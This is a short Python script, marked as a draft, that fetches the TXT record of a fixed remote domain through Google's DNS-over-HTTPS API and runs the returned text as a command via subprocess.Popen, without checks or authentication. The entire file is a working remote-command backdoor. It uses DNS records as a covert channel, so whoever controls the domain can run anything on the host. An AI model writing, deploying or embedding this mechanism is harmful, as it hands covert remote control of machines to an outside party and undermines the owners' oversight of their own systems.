#! /usr/bin/python
# Author: ShamiLakhani@hotmail.com
# Version:  0.1 - Draft.
# Objective: Reads and executes a command set in a text record of a domain.
# Uses Google DNS API to query the domain and read the record.

import requests, json

#main:
domain = "remotecommand.remotecontrol.cloudns.cx"
page = requests.get ("https://dns.google.com/resolve?name="+ domain + "&type=TXT&cd=1")

if page.status_code == 200:
    j = json.loads (page.content)
    executeCommand = (j['Answer'][0]['data'])
    from subprocess import Popen
    #Debug: print (executeCommand)
    Popen (executeCommand)
    exit()
else:
    print (page.status_code)
    exit()
